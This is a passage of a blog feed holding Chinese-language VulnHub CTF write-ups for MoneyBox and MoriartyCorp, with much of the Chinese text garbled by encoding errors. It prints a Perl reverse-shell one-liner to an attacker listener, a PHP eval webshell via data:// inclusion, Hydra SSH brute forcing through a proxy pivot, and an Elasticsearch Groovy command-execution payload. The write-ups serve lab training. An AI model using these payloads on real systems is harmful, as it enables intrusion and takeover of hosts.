class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">lily@MoneyBox:~$ history </span><br><span class="line">    1  whoami</span><br><span class="line">    2  exit</span><br><span class="line">    3  sudo -l</span><br><span class="line">    4  clear</span><br><span class="line">    5  find / -type f -user lily -perm 4000</span><br><span class="line">    6  find / -type f -user lily -perm 4000 2&gt;/dev/null</span><br><span class="line">    7  find / -type f -user root -perm 4000 2&gt;/dev/null</span><br><span class="line">    8  exit</span><br><span class="line">    9  find / -type f -user root -perm 4000 2&gt;/dev/null</span><br><span class="line">   10  find / -type f -user lily -perm 4000 2&gt;/dev/null</span><br><span class="line">   11  find / -type f -user lily -perm 4000 </span><br><span class="line">   12  clear</span><br><span class="line">   13  find / -type f -user lily -perm 4000 2&gt;/dev/null</span><br><span class="line">   14  exit</span><br><span class="line">   15  find / -type f -user lily -perm 4000 2&gt;/dev/null</span><br><span class="line">   16  find / -type f -root lily -perm 4000 2&gt;/dev/null</span><br><span class="line">   17  sudo -l</span><br><span class="line">   18  clear</span><br><span class="line">   19  exit</span><br><span class="line">   20  sudo -l</span><br><span class="line">   21  clear</span><br><span class="line">   22  exit</span><br><span class="line">   23  cd</span><br><span class="line">   24  clear</span><br><span class="line">   25  su renu</span><br><span class="line">   26  clear</span><br><span class="line">   27  cd /usr/bin/</span><br><span class="line">   28  ls</span><br><span class="line">   29  ls ping</span><br><span class="line">   30  ls -l ping</span><br><span class="line">   31  chmod u+s ping</span><br><span class="line">   32  chmod -u+s ping</span><br><span class="line">   33  ls -l ping</span><br><span class="line">   34  sudo chmod -u+s ping</span><br><span class="line">   35  ls -l ping</span><br><span class="line">   36  sudo chmod u+r ping</span><br><span class="line">   37  sudo chmod u+w ping</span><br><span class="line">   38  ls -l ping</span><br><span class="line">   39  sudo chmod g-s ping</span><br><span class="line">   40  ls -l ping</span><br><span class="line">   41  apt update</span><br><span class="line">   42  sudo apt update</span><br><span class="line">   43  ls</span><br><span class="line">   44  ls -l whoami</span><br><span class="line">   45  sudo chmod 400 ping</span><br><span class="line">   46  sudo chmod u+x ping</span><br><span class="line">   47  ls -l ping</span><br><span class="line">   48  clear</span><br><span class="line">   49  cd</span><br><span class="line">   50  cd /etc/</span><br><span class="line">   51  nano sudoers</span><br><span class="line">   52  sudo nano sudoers</span><br><span class="line">   53  cd /usr/bin</span><br><span class="line">   54  ls nano</span><br><span class="line">   55  ls more</span><br><span class="line">   56  clear</span><br><span class="line">   57  cd /etc/</span><br><span class="line">   58  sudo nano sudoers</span><br><span class="line">   59  su root</span><br><span class="line">   60  ls</span><br><span class="line">   61  ls -la</span><br><span class="line">   62  clear</span><br><span class="line">   63  ls -la</span><br><span class="line">   64  nano user2.txt</span><br><span class="line">   65  ls</span><br><span class="line">   66  cat user2.txt </span><br><span class="line">   67  exit</span><br><span class="line">   68  ls</span><br><span class="line">   69  cat user2.txt </span><br><span class="line">   70  exit</span><br><span class="line">   71  whoami</span><br><span class="line">   72  id</span><br><span class="line">   73  ls</span><br><span class="line">   74  cat user2.txt </span><br><span class="line">   75  sudo -s</span><br><span class="line">   76  history </span><br><span class="line">lily@MoneyBox:~$</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹lilyç”¨æˆ·å…·æœ‰sudoæƒé™çš„å‘½ä»¤ï¼Œå¯ä»¥å‘ç°perl</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lily@MoneyBox:~$ sudo -l</span><br><span class="line">Matching Defaults entries for lily on MoneyBox:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User lily may run the following commands on MoneyBox:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/perl</span><br></pre></td></tr></table></figure><p><code>perlåå¼¹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.56.104&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure><p><code>å¾—åˆ°shellï¼Œè·å¾—ç¬¬ä¸‰ä¸ªflag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ nc -nvlp 6666                                                                       1 â¨¯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.56.104] from (UNKNOWN) [192.168.56.103] 43008</span><br><span class="line"><span class="meta">#</span><span class="bash"> id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls </span></span><br><span class="line">user2.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/home/lily</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls -l</span></span><br><span class="line">total 0</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls -la</span></span><br><span class="line">total 28</span><br><span class="line">drwx------  3 root root 4096 Feb 26  2021 .</span><br><span class="line">drwxr-xr-x 18 root root 4096 Feb 25  2021 ..</span><br><span class="line">-rw-------  1 root root 2097 Feb 26  2021 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc</span><br><span class="line">drwxr-xr-x  3 root root 4096 Feb 25  2021 .local</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 root root  228 Feb 26  2021 .root.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat .root.txt</span></span><br><span class="line"></span><br><span class="line">Congratulations.......!</span><br><span class="line"></span><br><span class="line">You Successfully completed MoneyBox</span><br><span class="line"></span><br><span class="line">Finally The Root Flag</span><br><span class="line">    ==&gt; r00t&#123;H4ckth3p14n3t&#125;</span><br><span class="line"></span><br><span class="line">I&#x27;m Kirthik-KarvendhanT</span><br><span class="line">    It&#x27;s My First CTF Box</span><br><span class="line">         </span><br><span class="line">instagram : ____kirthik____</span><br><span class="line"></span><br><span class="line">See You Back....</span><br><span class="line">       </span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Difficulty : Easy&lt;/p&gt;
&lt;p&gt;Goal : 3 flags&lt;/p&gt;
&lt;p&gt;ä¸€å°CTFé£é¶æœºã€‚veryveryvery&lt;del&gt;~&lt;/del&gt;ez&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>MoriatyCorp</title>
    <link href="https://lunamoore.github.io/2021/09/19/MoriatyCorp/"/>
    <id>https://lunamoore.github.io/2021/09/19/MoriatyCorp/</id>
    <published>2021-09-19T08:17:12.000Z</published>
    <updated>2021-09-19T08:28:46.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote><p>Hello Agent.</p><p>Youâ€™re here on a special mission.</p><p>A mission to take down one of the biggest weapons suppliers which is Moriarty Corp.</p><p>Enter flag{start} into the webapp to get started!</p><p>Notes:</p><ul><li>Web panel is on port 8000 (not in scope. Donâ€™t attack)</li><li>Flags are stored in #_flag.txt format. Flags are entered in flag{} format. Theyâ€™re usually stored in / directory but can be in different locations.</li><li>To temporarily stop playing, pause the VM. Do not shut it down.</li><li>The webapp starts docker containers in the background when you add flags. Shutting down and rebooting will mess it up.</li></ul><p>(the story is bad. sorry for the lack of creativity)</p><p>Difficulty: Med-Hard</p></blockquote><a id="more"></a><p><strong>è¯´æ˜</strong></p><p><code>8000ç«¯å£æäº¤flagç«¯å£</code></p><h2 id="0x01-ä¸»æœºå‘ç°"><a href="#0x01-ä¸»æœºå‘ç°" class="headerlink" title="0x01.ä¸»æœºå‘ç°"></a>0x01.ä¸»æœºå‘ç°</h2><p><code>ä½¿ç”¨arpæ‰«æå¯ä»¥å‘ç°ç›®æ ‡ä¸»æœºä¸º192.168.56.102</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[âœ—]â”€[user@parrot]â”€[~]</span><br><span class="line">â””â”€â”€â•¼ $sudo arp-scan 192.168.56.0/24</span><br><span class="line">[sudo] password for user: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 08:00:27:00:7c:8d, IPv4: 192.168.56.101</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:0e    (Unknown: locally administered)</span><br><span class="line">192.168.56.100    08:00:27:fd:f0:0e    PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.102    08:00:27:81:9f:44    PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.110 seconds (121.33 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure><h2 id="0x02-ç«¯å£æ‰«æ"><a href="#0x02-ç«¯å£æ‰«æ" class="headerlink" title="0x02.ç«¯å£æ‰«æ"></a>0x02.ç«¯å£æ‰«æ</h2><p><code>å¯ä»¥å‘ç°å¼€æ”¾äº†22ã€8000ã€9000ç«¯å£ï¼Œ8000ä¸ºflagæäº¤ç«¯å£ï¼Œ9000ä¸ºdocker UIç«¯å£</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[user@parrot]â”€[~]</span><br><span class="line">â””â”€â”€â•¼ $sudo nmap -A 192.168.56.102</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-19 06:06 BST</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.56.102</span><br><span class="line">Host is up (0.0038s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 5a:a7:c8:64:2a:54:bc:64:48:16:2b:79:64:69:cc:45 (RSA)</span><br><span class="line">|   256 89:8d:6a:9b:44:e3:f1:f1:ef:8c:23:13:7a:84:fc:71 (ECDSA)</span><br><span class="line">|_  256 1d:e6:68:27:52:5b:6d:0d:67:5d:30:4c:03:68:b3:2a (ED25519)</span><br><span class="line">8000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="line">9000/tcp open  http    Portainer Docker UI 1.19.2</span><br><span class="line">|_http-title: Portainer</span><br><span class="line">MAC Address: 08:00:27:81:9F:44 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   3.78 ms 192.168.56.102</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds</span><br></pre></td></tr></table></figure><h2 id="0x03-è®¿é—®8000ç«¯å£"><a href="#0x03-è®¿é—®8000ç«¯å£" class="headerlink" title="0x03.è®¿é—®8000ç«¯å£"></a>0x03.è®¿é—®8000ç«¯å£</h2><p><code>æäº¤flag&#123;start&#125;å¼€å§‹ä»»åŠ¡</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919132104102.png" class><p><code>æ ¹æ®æç¤ºè®¿é—®80ç«¯å£</code></p><blockquote><p>è¿™é‡Œæ¯æäº¤ä¸€æ¬¡flagå°±ä¼šå¼€æ”¾ä¸‹ä¸€å…³çš„ç«¯å£ï¼Œæ¥ä¸‹æ¥å†æ‰«æä¸€ä¸‹ä¸»æœºã€‚å¯çœ‹åˆ°80ç«¯å£å·²ç»æ‰“å¼€</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[user@parrot]â”€[~]</span><br><span class="line">â””â”€â”€â•¼ $sudo nmap -p80 192.168.56.102</span><br><span class="line">[sudo] password for user: </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-19 06:22 BST</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.56.102</span><br><span class="line">Host is up (0.00049s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:81:9F:44 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds</span><br></pre></td></tr></table></figure><h2 id="0x04-è®¿é—®80ç«¯å£"><a href="#0x04-è®¿é—®80ç«¯å£" class="headerlink" title="0x04.è®¿é—®80ç«¯å£"></a>0x04.è®¿é—®80ç«¯å£</h2><p><code>å‘ç°?file=page1.htmlï¼Œç›´æ¥æµ‹è¯•æ–‡ä»¶åŒ…å«</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919134056565.png" class><p><code>æ–‡ä»¶åŒ…å«å­˜åœ¨ï¼Œåˆ©ç”¨phpä¸ºåè®®åŒ…å«ä¸€å¥è¯æœ¨é©¬</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919134159182.png" class><h2 id="0x05-èšå‰‘è¿æ¥"><a href="#0x05-èšå‰‘è¿æ¥" class="headerlink" title="0x05.èšå‰‘è¿æ¥"></a>0x05.èšå‰‘è¿æ¥</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><img src="/2021/09/19/MoriatyCorp/image-20210919140548766.png" class><h2 id="0x06-å†…ç½‘æ¸—é€"><a href="#0x06-å†…ç½‘æ¸—é€" class="headerlink" title="0x06.å†…ç½‘æ¸—é€"></a>0x06.å†…ç½‘æ¸—é€</h2><p><code>æ ¹æ®æç¤ºï¼Œå†…ç½‘ä¸­å­˜åœ¨ä¸€å°ä»»åŠ¡é¶æœº</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919140716899.png" class><p><code>æŸ¥çœ‹å½“å‰é¶æœºå†…ç½‘ipä¸º172.17.0.3</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919140927665.png" class><p><code>ä½¿ç”¨venomæ­å»ºsocksä»£ç†è¿›è¡Œå†…ç½‘ç©¿é€ï¼Œé¦–å…ˆä¸Šä¼ venomå®¢æˆ·ç«¯</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919141831153.png" class><p><code>æœåŠ¡ç«¯ç›‘å¬6666ç«¯å£</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919141604042.png" class><p><code>å®¢æˆ·ç«¯å›è¿ï¼Œæ„å»ºä»£ç†</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919142233220.png" class><p><code>proxychainsæ·»åŠ ä»£ç†é“¾</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919142655310.png" class><p><code>å†…ç½‘ä¸»æœºå‘ç°ï¼Œå‘ç°172.17.0.4çš„80ç«¯å£å¼€æ”¾</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919143306102.png" class><h2 id="0x07-è®¿é—®172-17-0-4"><a href="#0x07-è®¿é—®172-17-0-4" class="headerlink" title="0x07.è®¿é—®172.17.0.4"></a>0x07.è®¿é—®172.17.0.4</h2><p><code>è®¾ç½®ä»£ç†ï¼Œè®¿é—®172.17.0.4</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919143801325.png" class><p><code>å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå¹¶ä¸”éœ€è¦å¯†ç ï¼Œæ¥ä¸‹æ¥è¿›è¡Œçˆ†ç ´(bpåŒæ ·è®¾ç½®ä»£ç†)ï¼Œå¯†ç ä¸ºpassword</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919150345618.png" class><h2 id="0x08-ä¸Šä¼ webshell"><a href="#0x08-ä¸Šä¼ webshell" class="headerlink" title="0x08.ä¸Šä¼ webshell"></a>0x08.ä¸Šä¼ webshell</h2><img src="/2021/09/19/MoriatyCorp/image-20210919150522943.png" class><h2 id="0x09-å†°èè¿æ¥"><a href="#0x09-å†°èè¿æ¥" class="headerlink" title="0x09.å†°èè¿æ¥"></a>0x09.å†°èè¿æ¥</h2><p><code>å¾—åˆ°flag</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919150724877.png" class><h2 id="0x10-çˆ†ç ´ssh"><a href="#0x10-çˆ†ç ´ssh" class="headerlink" title="0x10.çˆ†ç ´ssh"></a>0x10.çˆ†ç ´ssh</h2><p><code>æ ¹æ®æç¤ºï¼Œç»™å‡ºäº†ç”¨æˆ·åä¸hashå€¼ï¼Œä½¿ç”¨Hydraè¿›è¡Œçˆ†ç ´ï¼Œé¦–å…ˆå‘ç°ç›®æ ‡ä¸»æœº</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919151013459.png" class><p><code>å‘ç°ç›®æ ‡ä¸»æœº172.17.0.6</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919151317025.png" class><p><code>çˆ†ç ´ï¼Œå°†æ˜æ–‡ç”¨æˆ·åä¸å¯†ç å†™å…¥æ–‡ä»¶(hashå€¼æ˜æ–‡éƒ½æ˜¯å¼±å£ä»¤ï¼Œç›´æ¥ç½‘ä¸Šæœç´¢å³å¯å¾—åˆ°)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[âœ—]â”€[user@parrot]â”€[~]</span><br><span class="line">â””â”€â”€â•¼ $cat user</span><br><span class="line">root</span><br><span class="line">toor</span><br><span class="line">admin</span><br><span class="line">mcorp</span><br><span class="line">moriarty</span><br><span class="line">â”Œâ”€[user@parrot]â”€[~]</span><br><span class="line">â””â”€â”€â•¼ $cat pass </span><br><span class="line">root</span><br><span class="line">toor</span><br><span class="line">password</span><br><span class="line">admin</span><br><span class="line">guest</span><br><span class="line">MORIARTY</span><br><span class="line">MCORP</span><br><span class="line">mcorp</span><br><span class="line">weapons</span><br><span class="line">moriarty</span><br><span class="line">â”Œâ”€[user@parrot]â”€[~]</span><br><span class="line">â””â”€â”€â•¼ $proxychains hydra -L user  -P pass ssh://172.17.0.6</span><br></pre></td></tr></table></figure><img src="/2021/09/19/MoriatyCorp/image-20210919152205364.png" class><h2 id="0x11-ç™»å…¥"><a href="#0x11-ç™»å…¥" class="headerlink" title="0x11.ç™»å…¥"></a>0x11.ç™»å…¥</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh root@172.17.0.6</span><br></pre></td></tr></table></figure><img src="/2021/09/19/MoriatyCorp/image-20210919152340149.png" class><h2 id="0x12-ç»§ç»­æ‰«æå†…ç½‘"><a href="#0x12-ç»§ç»­æ‰«æå†…ç½‘" class="headerlink" title="0x12.ç»§ç»­æ‰«æå†…ç½‘"></a>0x12.ç»§ç»­æ‰«æå†…ç½‘</h2><p><code>æ ¹æ®æç¤ºï¼Œç»§ç»­æ‰«æå†…ç½‘</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919152715932.png" class><img src="/2021/09/19/MoriatyCorp/image-20210919152744544.png" class><p><code>è®¿é—®172.17.0.7çš„8000ç«¯å£ï¼Œå‘ç°å¯ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼ŒæŠ“åŒ…å°è¯•ä¿®æ”¹adminå¯†ç ï¼Œä¿®æ”¹æˆåŠŸ</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919153811111.png" class><p><code>ä½¿ç”¨adminç™»å…¥</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919154031962.png" class><h2 id="0x13-æ‰«æ9200ç«¯å£"><a href="#0x13-æ‰«æ9200ç«¯å£" class="headerlink" title="0x13.æ‰«æ9200ç«¯å£"></a>0x13.æ‰«æ9200ç«¯å£</h2><p><code>æ ¹æ®æç¤ºï¼Œå†…ç½‘ä¸­å­˜åœ¨ä¸€å°ElasticsearchæœåŠ¡å™¨ï¼ŒElasticsearchçš„ç«¯å£ä¸º9200</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919154255839.png" class><p><code>æ‰«æ9200ç«¯å£</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919154612698.png" class><p><code>è®¿é—®172.17.0.8çš„9200ç«¯å£</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919160606795.png" class><h2 id="0x14-åˆ©ç”¨"><a href="#0x14-åˆ©ç”¨" class="headerlink" title="0x14.åˆ©ç”¨"></a>0x14.åˆ©ç”¨</h2><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc4NDA1Ni9hcnRpY2xlL2RldGFpbHMvMTA1ODc3NDAx">å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;  &quot;name&quot;: &quot;kjsx&quot;&#125;</span><br></pre></td></tr></table></figure><img src="/2021/09/19/MoriatyCorp/image-20210919160739682.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;ls\&quot;).getText()&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2021/09/19/MoriatyCorp/image-20210919160814798.png" class><img src="/2021/09/19/MoriatyCorp/image-20210919160940650.png" class><img src="/2021/09/19/MoriatyCorp/image-20210919161011521.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-å®˜ç½‘æè¿°&quot;&gt;&lt;a href=&quot;#0x00-å®˜ç½‘æè¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.å®˜ç½‘æè¿°&quot;&gt;&lt;/a&gt;0x00.å®˜ç½‘æè¿°&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Hello Agent.&lt;/p&gt;
&lt;p&gt;Youâ€™re here on a special mission.&lt;/p&gt;
&lt;p&gt;A mission to take down one of the biggest weapons suppliers which is Moriarty Corp.&lt;/p&gt;
&lt;p&gt;Enter flag{start} into the webapp to get started!&lt;/p&gt;
&lt;p&gt;Notes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web panel is on port 8000 (not in scope. Donâ€™t attack)&lt;/li&gt;
&lt;li&gt;Flags are stored in #_flag.txt format. Flags are entered in flag{} format. Theyâ€™re usually stored in / directory but can be in different locations.&lt;/li&gt;
&lt;li&gt;To temporarily stop playing, pause the VM. Do not shut it down.&lt;/li&gt;
&lt;li&gt;The webapp starts docker containers in the background when you add flags. Shutting down and rebooting will mess it up.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(the story is bad. sorry for the lack of creativity)&lt;/p&gt;
&lt;p&gt;Difficulty: Med-Hard&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    
